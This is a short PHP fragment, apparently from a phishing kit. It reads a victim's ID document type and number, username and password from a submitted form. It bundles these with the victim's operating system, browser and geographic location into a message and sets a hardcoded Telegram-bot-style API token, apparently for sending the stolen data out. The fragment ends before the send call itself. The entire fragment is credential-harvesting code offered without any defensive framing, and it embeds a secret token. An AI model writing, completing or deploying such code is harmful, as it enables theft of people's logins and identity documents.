...
////////////////////
   if ( isset ($_POST['tipoDocu']) && isset ($_POST['userDocumento']) && isset ($_POST['pase']) && isset ($_POST['usernam']) ){


$message = "🪪TipodeDocumento: ".$_POST['tipoDocu']."\r\n🪪Numero doc: ".$_POST['userDocumento']."\r\n👤Usuario: ".$_POST['usernam']."\r\n🔒P4sx: ".$_POST['pase']." \r\n";
$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "6793182475:AAHPMwnxFFxVp0mje9j6bfqLYdeLyS71aJ4";
